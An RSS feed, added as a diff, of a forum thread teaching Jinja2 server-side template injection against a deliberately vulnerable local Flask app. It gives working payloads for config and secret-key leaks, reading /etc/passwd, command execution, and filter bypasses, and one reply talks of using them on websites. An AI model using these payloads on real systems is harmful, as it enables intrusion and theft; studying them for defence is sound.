@@ -1,0 +1,373 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Explaining Server Side Template Injections</title>
+    <link>https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297</link>
+    <description>Hey, I am chivato, this is my first post on here and I hope it is of some use to people. Exploiting SSTI in strange cases will be the next post I make. Any and all feedback is appreciated &lt;3.
+
+**Building the environment:**
+
+We start with just a basic flask web application, written in python (I will be using python 2), which is as follows:
+
+    from flask import *
+
+    app = Flask(__name__)
+
+    @app.route(&quot;/&quot;)
+    def home():
+        return &quot;Hello, World!&quot;
+
+    if __name__ == &quot;__main__&quot;:
+        app.run(debug=True, host=&quot;localhost&quot;, port=1337)
+
+This website will just return &quot;Hello, World!&quot; when visited. Now, we need to add parameters so we can interact with the web application. This can be done with the &quot;requests&quot; part of Flask, so we just add request.args.get(&#39;parameter name&#39;). In my case the parameter will be called &quot;name&quot;, here is how our code should look:
+
+    from flask import *
+
+    app = Flask(__name__)
+
+    @app.route(&quot;/&quot;)
+    def home():
+    	output = request.args.get(&#39;name&#39;)
+        return output
+
+    if __name__ == &quot;__main__&quot;:
+        app.run(debug=True, host=&quot;localhost&quot;, port=1337)
+
+But since this always returns the value in the get request, if you go to the website without a get parameter called name, you will get an error. To fix this I included a simple if statement:
+
+    from flask import *
+
+    app = Flask(__name__)
+
+    @app.route(&quot;/&quot;)
+    def home():
+            output = request.args.get(&#39;name&#39;)
+            if output:
+                    pass
+            else:
+                    output = &quot;Empty&quot;
+            return output
+
+    if __name__ == &quot;__main__&quot;:
+        app.run(debug=True, host=&quot;localhost&quot;, port=1337)
+
+Perfect, now we have a flask app that returns the value in the get parameter and doesn&#39;t crash. Now to implement the vulnerability, the vulnerability consists of templates being executed on the side of the server, when we have control of what the template contains, for example a vulnerability was found in Uber by the famous bug hunter known as orange, it consisted of making your profile name follow the template syntax for jinja2 (which is {{template content}} for jinja2). and then when you received the email, the template had been executed. So, imagine you set {{&#39;7&#39;*7}} as your username, when you receive the email, you will see &quot;Welcome 7777777.&quot;
+
+As stated above, the vulnerability comes into play when the template is executed on the side of the server, and we control the input, so let&#39;s make sure our input is rendered. This can be done with render_template_string from flask. This takes a string, and treats it as text that may have any templates in it, if it does, then it executes the template.
+
+    from flask import *
+
+    app = Flask(__name__)
+
+    @app.route(&quot;/&quot;)
+    def home():
+            output = request.args.get(&#39;name&#39;)
+            output = render_template_string(output)
+            if output:
+                    pass
+            else:
+                    output = &quot;Sp0re&lt;3&quot;
+            return output
+
+    if __name__ == &quot;__main__&quot;:
+        app.run(debug=True, host=&quot;localhost&quot;, port=1337)
+
+As you can see, now, if you visit &quot;http://localhost:1337/?name={{%277%27*7}}&quot;, you will be welcomed with &quot;7777777&quot;. We now have our environment setup and ready to play with (later on I will be looking at some simple WAF bypass methods, but for now we are just leaving our script as this).
+
+**Recongnising and exploiting the vulnerability:**
+
+So template engines are used VERY widely nowadays, and they exist for a variety of different languages, such as PHP, JS, Python (obviously), ruby and many more. The base of why they are useful is in case you have a large website or platform, where not many details change between pages. For example, netflix, has the same layout for it&#39;s content, and the only things that change are: title, description, banner and some other minor details, so instead of creating a whole page per show, they just feed the data to their templates, and then the engine puts it all together.
+
+Template engines can be used for anything that follows that process of having to use the same thing tons of times, so in Uber&#39;s example instead of making a new email every time, they had a single email template, and just changed in the name each time.
+
+So, knowing that we can execute templates, what can we actually do with that, well, honestly a lot.
+
+
+**&gt; Read the configuration.**
+
+This can be used to grab the SECRET_KEY which is used to sign cookies, with this, you can create and sign your own cookies.
+
+Example payload for Jinja2:
+`{{ config }}`
+
+
+**&gt; Read local files (LFR).**
+
+This can be used to do a variety of things, ranging from directly reading a flag if it is held in the templates folder with a basic {% include &#39;flag.txt&#39; %}, to reading any file on the system this can be via the RCE payload (see next point), or via an alternative.
+
+An example payload of an alternative would be:
+`{{ &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read() }}`  //May vary depending on version.
+
+
+**&gt; Remote command execution (RCE).**
+
+Finally, the remote command execution payload. Obviously the most severe and dangerous one, and can be done a variety of ways, one is going through the subclasses and finding the subprocess.Popen number:
+`{{&#39;&#39;.__class__.mro()[1].__subclasses__()[ HERE IS WHERE THE NUMBER WOULD GO ](&#39;cat flag.txt&#39;,shell=True,stdout=-1).communicate()[0].strip()}}`
+
+Although I have had much more success with the following payload, which uses Popen without guessing the offset.
+`{% for x in ().__class__.__base__.__subclasses__() %}{% if &quot;warning&quot; in x.__name__ %}{{x()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&quot;whoami&quot;).read().zfill(417)}}{%endif%}{% endfor %}`
+You may need to go to the end of the page to skip all the 0&#39;s that are produced from that payload.
+
+
+Now that some of the basic exploits are over, we can take a look at bypass methods. Let&#39;s start with the parameter bypass method.
+
+Imagine you have a template engine, in this case flask, that takes a value from a parameter and removes any &quot;\_&quot; from it. This would restrict us from doing a variety of things, for example {{ \_\_class\_\_ }}. So, this bypass mehtod is based off of the idea that, only that parameter gets checked for the underscores. So all we have to do is pass the underscores via another parameter, and call them from our template injection.
+
+We start with calling the class attribute from request (The waf would block the underscores).
+`{{request.__class__}}`
+
+Then, we remove the &quot;.&quot; and user the |attr to tell the template that we are using request&#39;s attributes.
+`{{request|attr(&quot;__class__&quot;)}}`
+
+We pipe the whole content of the &quot;attribute&quot; parameter to a &quot;join&quot; function, which sticks all of the value together, in this case it would stick &quot;__&quot;, &quot;class&quot; and &quot;__&quot; together, to create __class__.
+`{{request|attr([&quot;__&quot;,&quot;class&quot;,&quot;__&quot;]|join)}}`
+
+We then remove one of the underscores, and just multiply the single one by two, in python, using &quot;[STRING]&quot;*[NUMBER] will make a new string of the previously stated strings, that amount of times. So &quot;test&quot;*3 would be equal to &quot;testtest&quot;.
+`{{request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)}}`
+
+Finally, we tell the paytload to get the underscores from the other parameter called &quot;usc&quot;, and we add the underscores to the other parameter, an example URL to use against our script would be:
+`http://localhost:1337/?name={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&amp;usc=_`
+This may just return Empty, since we set an if statement that basically stated if out rendered template is empty then just set the output to Empty.
+
+Moving on to the next bypass method, this one is used to bypass the &quot;[&quot;, &quot;]&quot; being blocked, since they are needed for the payload stated above.
+
+It is honestly just a syntax thing, but it manages to achieve the same thing, without having to use any &quot;[&quot;, &quot;]&quot;, or &quot;\_&quot;.
+Some examples are:
+`http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&amp;class=class&amp;usc=_`
+`http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_`
+These were pulled from an amazing page called &quot;PayloadAllTheThings&quot;, link can be found at the bottom of the article in the sources part.
+
+Another one is in case &quot;.&quot; is blocked, and it uses the Jinja2 filters with |attr():
+`http://localhost:1337/?name={{request|attr([%22_%22*2,%22class%22,%22_%22*2]|join)}}`
+
+Finally, a bypass method that is used in case &quot;[&quot;, &quot;]&quot;, &quot;|join&quot; and / or &quot;\_&quot; is blocked, since it uses none of the previously stated characters:
+`http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_`
+
+
+Now these are just the base bypass payloads, but can be combined and manipulated to achieve some amazing things.
+
+Here is a payload I made myself to build a payload that leaks the config:
+`{{request|attr([&quot;url&quot;,request.args.usc,&quot;for.&quot;,request.args.usc*2,request.args.1,request.args.usc*2,&quot;.current&quot;,request.args.usc,&quot;app.&quot;,request.args.conf]|join)}}&amp;1=globals&amp;usc=_&amp;link=url&amp;conf=config`
+
+
+**Conclusion:**
+This has just been a basic explanation of how to setup a website vulnerable to SSTI, how the exploitation works, and some basic bypass methods for any WAF&#39;s that you may encounter. Also would like to shout out a moderator from HackTheBox called &quot;makelaris&quot;, since he was actually the one who sparked my interest for SSTI&#39;s, and has taught me a lot about them. If this post is enjoyed and appreciated I will make more about more advanced SSTI exploitation cases, and also how SSTI&#39;s may work and be exploited in other template engines.
+
+
+**Sources:**
+
+PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
+pequalsnp-team: https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
+A good HackTheBox retired machine that has an SSTI step: Oz (https://www.hackthebox.eu/home/machines/profile/152)
+A writeup for Oz machine: https://0xdf.gitlab.io/2019/01/12/htb-oz.html
+More exploring SSTI&#39;s: https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html
+Orange&#39;s disclosed bug bounty report from Uber: https://hackerone.com/reports/125980</description>
+    
+    <lastBuildDate>Tue, 31 Dec 2019 02:36:42 +0000</lastBuildDate>
+    <category>Web Hacking</category>
+    <atom:link href="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Explaining Server Side Template Injections</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/7</link>
+        <pubDate>Thu, 16 Jan 2020 12:31:18 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-16297-7</guid>
+        <source url="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297.rss">Explaining Server Side Template Injections</source>
+      </item>
+      <item>
+        <title>Explaining Server Side Template Injections</title>
+        <dc:creator><![CDATA[chivato]]></dc:creator>
+        <description><![CDATA[
+            <p>So you can usually tell if the page is using a template engine by keeping an eye out for different pages that use the same “templates” (with minimal changes, such as usernames, or information), so you can sort of guess that they are using a template engine to make everything more efficient.</p>
+          <p><a href="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/6</link>
+        <pubDate>Tue, 31 Dec 2019 02:36:42 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-16297-6</guid>
+        <source url="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297.rss">Explaining Server Side Template Injections</source>
+      </item>
+      <item>
+        <title>Explaining Server Side Template Injections</title>
+        <dc:creator><![CDATA[emptyArray]]></dc:creator>
+        <description><![CDATA[
+            <p>Great read.  How do you know what kind/if a website is using a templating engine?</p>
+          <p><a href="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/5</link>
+        <pubDate>Mon, 30 Dec 2019 15:57:08 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-16297-5</guid>
+        <source url="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297.rss">Explaining Server Side Template Injections</source>
+      </item>
+      <item>
+        <title>Explaining Server Side Template Injections</title>
+        <dc:creator><![CDATA[Abuubakar_Mohamed]]></dc:creator>
+        <description><![CDATA[
+            <p>Very cool, chivato cant wait to use this exploit on websites and to LFR. Very clear instructions as well.<br>
+What a hacker</p>
+          <p><a href="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/4</link>
+        <pubDate>Tue, 17 Sep 2019 17:47:08 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-16297-4</guid>
+        <source url="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297.rss">Explaining Server Side Template Injections</source>
+      </item>
+      <item>
+        <title>Explaining Server Side Template Injections</title>
+        <dc:creator><![CDATA[Cgboal]]></dc:creator>
+        <description><![CDATA[
+            <p>Awesome post, thanks for sharing and contributing to the English cyber criminal underground</p>
+          <p><a href="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/3</link>
+        <pubDate>Mon, 16 Sep 2019 20:41:51 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-16297-3</guid>
+        <source url="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297.rss">Explaining Server Side Template Injections</source>
+      </item>
+      <item>
+        <title>Explaining Server Side Template Injections</title>
+        <dc:creator><![CDATA[chivato]]></dc:creator>
+        <description><![CDATA[
+            <p>RE: Explaining the basics of Server Side Template Injections.</p>
+<p>I am not an expert, there is tons of room for improvement, and this is just my understanding / conclusion from researching and searching through documentation. If anything is wrong please do query it, and I would love to discuss any of this further!</p>
+          <p><a href="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/2</link>
+        <pubDate>Mon, 16 Sep 2019 20:32:38 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-16297-2</guid>
+        <source url="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297.rss">Explaining Server Side Template Injections</source>
+      </item>
+      <item>
+        <title>Explaining Server Side Template Injections</title>
+        <dc:creator><![CDATA[chivato]]></dc:creator>
+        <description><![CDATA[
+            <p>Hey, I am chivato, this is my first post on here and I hope it is of some use to people. Exploiting SSTI in strange cases will be the next post I make. Any and all feedback is appreciated &lt;3.</p>
+<p><strong>Building the environment:</strong></p>
+<p>We start with just a basic flask web application, written in python (I will be using python 2), which is as follows:</p>
+<pre><code>from flask import *
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return "Hello, World!"
+
+if __name__ == "__main__":
+    app.run(debug=True, host="localhost", port=1337)
+</code></pre>
+<p>This website will just return “Hello, World!” when visited. Now, we need to add parameters so we can interact with the web application. This can be done with the “requests” part of Flask, so we just add request.args.get(‘parameter name’). In my case the parameter will be called “name”, here is how our code should look:</p>
+<pre><code>from flask import *
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+	output = request.args.get('name')
+    return output
+
+if __name__ == "__main__":
+    app.run(debug=True, host="localhost", port=1337)
+</code></pre>
+<p>But since this always returns the value in the get request, if you go to the website without a get parameter called name, you will get an error. To fix this I included a simple if statement:</p>
+<pre><code>from flask import *
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+        output = request.args.get('name')
+        if output:
+                pass
+        else:
+                output = "Empty"
+        return output
+
+if __name__ == "__main__":
+    app.run(debug=True, host="localhost", port=1337)
+</code></pre>
+<p>Perfect, now we have a flask app that returns the value in the get parameter and doesn’t crash. Now to implement the vulnerability, the vulnerability consists of templates being executed on the side of the server, when we have control of what the template contains, for example a vulnerability was found in Uber by the famous bug hunter known as orange, it consisted of making your profile name follow the template syntax for jinja2 (which is {{template content}} for jinja2). and then when you received the email, the template had been executed. So, imagine you set {{‘7’*7}} as your username, when you receive the email, you will see “Welcome 7777777.”</p>
+<p>As stated above, the vulnerability comes into play when the template is executed on the side of the server, and we control the input, so let’s make sure our input is rendered. This can be done with render_template_string from flask. This takes a string, and treats it as text that may have any templates in it, if it does, then it executes the template.</p>
+<pre><code>from flask import *
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+        output = request.args.get('name')
+        output = render_template_string(output)
+        if output:
+                pass
+        else:
+                output = "Sp0re&lt;3"
+        return output
+
+if __name__ == "__main__":
+    app.run(debug=True, host="localhost", port=1337)
+</code></pre>
+<p>As you can see, now, if you visit “<a href="http://localhost:1337/?name=%7B%7B%277%27*7%7D" rel="nofollow noopener">http://localhost:1337/?name={{‘7’*7}</a>}”, you will be welcomed with “7777777”. We now have our environment setup and ready to play with (later on I will be looking at some simple WAF bypass methods, but for now we are just leaving our script as this).</p>
+<p><strong>Recongnising and exploiting the vulnerability:</strong></p>
+<p>So template engines are used VERY widely nowadays, and they exist for a variety of different languages, such as PHP, JS, Python (obviously), ruby and many more. The base of why they are useful is in case you have a large website or platform, where not many details change between pages. For example, netflix, has the same layout for it’s content, and the only things that change are: title, description, banner and some other minor details, so instead of creating a whole page per show, they just feed the data to their templates, and then the engine puts it all together.</p>
+<p>Template engines can be used for anything that follows that process of having to use the same thing tons of times, so in Uber’s example instead of making a new email every time, they had a single email template, and just changed in the name each time.</p>
+<p>So, knowing that we can execute templates, what can we actually do with that, well, honestly a lot.</p>
+<p><strong>&gt; Read the configuration.</strong></p>
+<p>This can be used to grab the SECRET_KEY which is used to sign cookies, with this, you can create and sign your own cookies.</p>
+<p>Example payload for Jinja2:<br>
+<code>{{ config }}</code></p>
+<p><strong>&gt; Read local files (LFR).</strong></p>
+<p>This can be used to do a variety of things, ranging from directly reading a flag if it is held in the templates folder with a basic {% include ‘flag.txt’ %}, to reading any file on the system this can be via the RCE payload (see next point), or via an alternative.</p>
+<p>An example payload of an alternative would be:<br>
+<code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</code>  //May vary depending on version.</p>
+<p><strong>&gt; Remote command execution (RCE).</strong></p>
+<p>Finally, the remote command execution payload. Obviously the most severe and dangerous one, and can be done a variety of ways, one is going through the subclasses and finding the subprocess.Popen number:<br>
+<code>{{''.__class__.mro()[1].__subclasses__()[ HERE IS WHERE THE NUMBER WOULD GO ]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}</code></p>
+<p>Although I have had much more success with the following payload, which uses Popen without guessing the offset.<br>
+<code>{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("whoami").read().zfill(417)}}{%endif%}{% endfor %}</code><br>
+You may need to go to the end of the page to skip all the 0’s that are produced from that payload.</p>
+<p>Now that some of the basic exploits are over, we can take a look at bypass methods. Let’s start with the parameter bypass method.</p>
+<p>Imagine you have a template engine, in this case flask, that takes a value from a parameter and removes any “_” from it. This would restrict us from doing a variety of things, for example {{ __class__ }}. So, this bypass mehtod is based off of the idea that, only that parameter gets checked for the underscores. So all we have to do is pass the underscores via another parameter, and call them from our template injection.</p>
+<p>We start with calling the class attribute from request (The waf would block the underscores).<br>
+<code>{{request.__class__}}</code></p>
+<p>Then, we remove the “.” and user the |attr to tell the template that we are using request’s attributes.<br>
+<code>{{request|attr("__class__")}}</code></p>
+<p>We pipe the whole content of the “attribute” parameter to a “join” function, which sticks all of the value together, in this case it would stick “<strong>", “class” and "</strong>” together, to create <strong>class</strong>.<br>
+<code>{{request|attr(["__","class","__"]|join)}}</code></p>
+<p>We then remove one of the underscores, and just multiply the single one by two, in python, using “[STRING]”*[NUMBER] will make a new string of the previously stated strings, that amount of times. So “test”*3 would be equal to “testtest”.<br>
+<code>{{request|attr(["_"*2,"class","_"*2]|join)}}</code></p>
+<p>Finally, we tell the paytload to get the underscores from the other parameter called “usc”, and we add the underscores to the other parameter, an example URL to use against our script would be:<br>
+<code>http://localhost:1337/?name={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&amp;usc=_</code><br>
+This may just return Empty, since we set an if statement that basically stated if out rendered template is empty then just set the output to Empty.</p>
+<p>Moving on to the next bypass method, this one is used to bypass the “[”, “]” being blocked, since they are needed for the payload stated above.</p>
+<p>It is honestly just a syntax thing, but it manages to achieve the same thing, without having to use any “[”, “]”, or “_”.<br>
+Some examples are:<br>
+<code>http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&amp;class=class&amp;usc=_</code><br>
+<code>http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_</code><br>
+These were pulled from an amazing page called “PayloadAllTheThings”, link can be found at the bottom of the article in the sources part.</p>
+<p>Another one is in case “.” is blocked, and it uses the Jinja2 filters with |attr():<br>
+<code>http://localhost:1337/?name={{request|attr([%22_%22*2,%22class%22,%22_%22*2]|join)}}</code></p>
+<p>Finally, a bypass method that is used in case “[”, “]”, “|join” and / or “_” is blocked, since it uses none of the previously stated characters:<br>
+<code>http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_</code></p>
+<p>Now these are just the base bypass payloads, but can be combined and manipulated to achieve some amazing things.</p>
+<p>Here is a payload I made myself to build a payload that leaks the config:<br>
+<code>{{request|attr(["url",request.args.usc,"for.",request.args.usc*2,request.args.1,request.args.usc*2,".current",request.args.usc,"app.",request.args.conf]|join)}}&amp;1=globals&amp;usc=_&amp;link=url&amp;conf=config</code></p>
+<p><strong>Conclusion:</strong><br>
+This has just been a basic explanation of how to setup a website vulnerable to SSTI, how the exploitation works, and some basic bypass methods for any WAF’s that you may encounter. Also would like to shout out a moderator from HackTheBox called “makelaris”, since he was actually the one who sparked my interest for SSTI’s, and has taught me a lot about them. If this post is enjoyed and appreciated I will make more about more advanced SSTI exploitation cases, and also how SSTI’s may work and be exploited in other template engines.</p>
+<p><strong>Sources:</strong></p>
+<p>PayloadAllTheThings: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md" rel="nofollow noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md</a><br>
+pequalsnp-team: <a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti" rel="nofollow noopener">https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti</a><br>
+A good HackTheBox retired machine that has an SSTI step: Oz (<a href="https://www.hackthebox.eu/home/machines/profile/152" rel="nofollow noopener">https://www.hackthebox.eu/home/machines/profile/152</a>)<br>
+A writeup for Oz machine: <a href="https://0xdf.gitlab.io/2019/01/12/htb-oz.html" rel="nofollow noopener">https://0xdf.gitlab.io/2019/01/12/htb-oz.html</a><br>
+More exploring SSTI’s: <a href="https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html" rel="nofollow noopener">https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html</a><br>
+Orange’s disclosed bug bounty report from Uber: <a href="https://hackerone.com/reports/125980" rel="nofollow noopener">https://hackerone.com/reports/125980</a></p>
+          <p><a href="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297/1</link>
+        <pubDate>Mon, 16 Sep 2019 20:31:15 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-16297-1</guid>
+        <source url="https://d.clarkee.co.uk/t/explaining-server-side-template-injections/16297.rss">Explaining Server Side Template Injections</source>
+      </item>
+  </channel>
+</rss>
